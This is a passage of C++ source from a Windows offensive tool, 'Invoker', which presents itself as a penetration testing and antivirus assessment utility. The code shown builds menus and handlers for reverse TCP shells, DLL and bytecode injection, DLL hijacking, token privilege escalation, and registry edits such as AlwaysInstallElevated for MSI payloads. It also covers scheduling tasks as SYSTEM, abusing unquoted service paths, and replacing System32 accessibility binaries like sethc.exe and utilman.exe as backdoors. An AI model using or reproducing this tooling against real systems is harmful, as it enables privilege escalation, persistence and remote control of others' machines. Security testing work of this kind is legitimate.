		printf("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                            #\n");
		printf("# Subkey : Software\\Policies\\Microsoft\\Windows\\Installer                     #\n");
		printf("# Name   : AlwaysInstallElevated                                             #\n");
		printf("# Data   : 1                                                                 #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Only the string value type (REG_SZ) can be added at the moment.            #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# If exploiting the \"AlwaysInstallElevated\" policy, use an MSI payload.      #\n");
		printf("##############################################################################\n");
		printf("\n");
		printf("############################### REGISTRY HIVES ###############################\n");
		printf("# [ 1] HKEY_CLASSES_ROOT                                                     #\n");
		printf("# [ 2] HKEY_CURRENT_USER                                                     #\n");
		printf("# [ 3] HKEY_LOCAL_MACHINE                                                    #\n");
		printf("# [ 4] HKEY_USERS                                                            #\n");
		printf("# [ 5] HKEY_CURRENT_CONFIG                                                   #\n");
		printf("##############################################################################\n");
		std::string choice = Invoker::Input("Select registry hive");
		printf("\n");
		DWORD num = 0;
		if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 5) {
			HKEY hKey = NULL;
			switch (num) {
				case 1: { hKey = HKEY_CLASSES_ROOT;   break; }
				case 2: { hKey = HKEY_CURRENT_USER;   break; }
				case 3: { hKey = HKEY_LOCAL_MACHINE;  break; }
				case 4: { hKey = HKEY_USERS;          break; }
				case 5: { hKey = HKEY_CURRENT_CONFIG; break; }
			}
			std::string subkey = Invoker::Input("Enter subkey");
			printf("\n");
			std::string name = Invoker::Input("Enter value name");
			printf("\n");
			std::string data = Invoker::Input("Enter value data");
			printf("\n");
			if (Invoker::StrToLower(Invoker::Input("Add/Edit (yes)")) == "yes") {
				printf("\n");
				Invoker::EditRegistryKey(&hKey, subkey, name, data);
			}
		}
		else {
			printf("Invalid choice\n");
		}
	}

	void ScheduleTask() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Name : CMD                                                                 #\n");
		printf("# User : Kira                                                                #\n");
		printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe           #\n");
		printf("# Args : /K WHOAMI /PRIV                                                     #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# Name : PowerShell                                                          #\n");
		printf("# User : NT AUTHORITY\\SYSTEM                                                 #\n");
		printf("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe           #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Task will run only if the user is logged-in interactively.                 #\n");
		printf("# Task will run only once, after exactly one minute.                         #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string name = Invoker::Input("Enter task name");
		printf("\n");
		std::string user = Invoker::Input("Enter user name");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		std::string args = Invoker::Input("Enter file arguments (optional)");
		printf("\n");
		if (name.length() < 1 || user.length() < 1 || file.length() < 1) {
			printf("Required parameters are missing\n");
		}
		else {
			Invoker::ScheduleTask(name, user, file, args);
		}
	}

	// --------------------------------------- SECTION: SERVICES

	void UnquotedServicePaths() {
		std::string name = Invoker::GetUnquotedServiceName();
		if (name.length() > 0) {
			printf("\n");
			printf("############################### MENAGE SERVICE ###############################\n");
			printf("# [ 1] Start                                                                 #\n");
			printf("# [ 2] Stop                                                                  #\n");
			printf("# [ 3] Restart                                                               #\n");
			printf("##############################################################################\n");
			std::string choice = Invoker::Input("Your choice");
			printf("\n");
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { Invoker::ManageService(name, SVC_START);   break; }
					case 2: { Invoker::ManageService(name, SVC_STOP);    break; }
					case 3: { Invoker::ManageService(name, SVC_RESTART); break; }
				}
			}
			else {
				printf("Invalid choice\n");
			}
		}
	}

	// --------------------------------------- SECTION: MISCELLANEOUS

	void ReplaceSystem32FilesMenu() {
		std::string choice = "0";
		do {
			printf("########################### REPLACE SYSTEM32 FILES ###########################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Accessibility Menu                                                    #\n");
			printf("# [ 2] App Switcher                                                          #\n");
			printf("# [ 3] Display Switcher                                                      #\n");
			printf("# [ 4] Magnifier                                                             #\n");
			printf("# [ 5] Narrator                                                              #\n");
			printf("# [ 6] On-Screen Keyboard                                                    #\n");
			printf("# [ 7] Sticky Keys                                                           #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 8] All                                                                   #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 8) {
				const char* files[] = { "AtBroker.exe", "utilman.exe", "DisplaySwitch.exe", "Magnify.exe", "Narrator.exe", "osk.exe", "sethc.exe" };
				switch (num) {
					case 1: { Invoker::ReplaceSystem32File(files[0]); break; }
					case 2: { Invoker::ReplaceSystem32File(files[1]); break; }
					case 3: { Invoker::ReplaceSystem32File(files[2]); break; }
					case 4: { Invoker::ReplaceSystem32File(files[3]); break; }
					case 5: { Invoker::ReplaceSystem32File(files[4]); break; }
					case 6: { Invoker::ReplaceSystem32File(files[5]); break; }
					case 7: { Invoker::ReplaceSystem32File(files[6]); break; }
					case 8: {
						int size = sizeof(files) / sizeof(files[0]);
						for (int i = 0; i < size; i++) {
							if (i) { printf("\n"); printf("------------------------------------------------------------------------------\n"); printf("\n"); };
							Invoker::ReplaceSystem32File(files[i]);
						}
						break;
					}
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: MAIN

	void Title() {
		SetConsoleTitleA("Invoker");
	}

	void Usage() {
		printf("Usage:   Invoker.exe <address:port>\n");
		printf("Example: Invoker.exe 192.168.8.5:9000\n");
	}

	void Menu() {
		std::string choice = "0";
		do {
			printf("##############################################################################\n");
			printf("#                                                                            #\n");
			printf("#                               Invoker v5.7.3                               #\n");
			printf("#                                  by Ivan Sincek                            #\n");
			printf("#                                                                            #\n");
			printf("# Penetration testing utility and antivirus assessment tool.                 #\n");
			printf("# GitHub repository at github.com/ivan-sincek/invoker.                       #\n");
			printf("# Feel free to donate ETH at 0xbc00e800f29524AD8b0968CEBEAD4cD5C5c1f105.     #\n");
			printf("#                                                                            #\n");
			printf("#################################### MENU ####################################\n");
			printf("# [ 0] Exit                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Invoke System Shells                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 2] Direct System Calls                                                   #\n");
			printf("# [ 3] Windows Management Instrumentation (WMI)                              #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 4] Reverse TCP                                                           #\n");
			printf("# [ 5] Manage Processes                                                      #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 6] Executable Image Tampering                                            #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 7] Inject Bytecode                                                       #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 8] Inject DLL                                                            #\n");
			printf("# [ 9] Install Windows Hook From DLL                                         #\n");
			printf("# [10] List Process DLLs                                                     #\n");
			printf("# [11] Invoke DLL Hijacking                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [12] Enable Access Token Privileges                                        #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [13] Download File                                                         #\n");
			printf("# [14] Add/Edit Registry Key                                                 #\n");
			printf("# [15] Schedule Task                                                         #\n");
			printf("# [16] Unquoted Service Paths                                                #\n");
			printf("# [17] Replace System32 Files                                                #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 17) {
				switch (num) {
					case  1: { InvokeSystemShellsMenu();   break; }
					case  2: { DSCMenu();                  break; }
					case  3: { WMIMenu();                  break; }
					case  4: { ReverseTCP();               break; }
					case  5: { ManageProcessesMenu();      break; }
					case  6: { ExeImageTamperingMenu();    break; }
					case  7: { InjectBytecodeMenu();       break; }
					case  8: { InjectDLLMenu();            break; }
					case  9: { InstallWindowsHook();       break; }
					case 10: { ListProcessDLLs();          break; }
					case 11: { DLLHijacking();             break; }
					case 12: { EnableAccessTokenPrivs();   break; }
					case 13: { DownloadFile();             break; }
					case 14: { EditRegistryKey();          break; }
					case 15: { ScheduleTask();             break; }
					case 16: { UnquotedServicePaths();     break; }
					case 17: { ReplaceSystem32FilesMenu(); break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

}
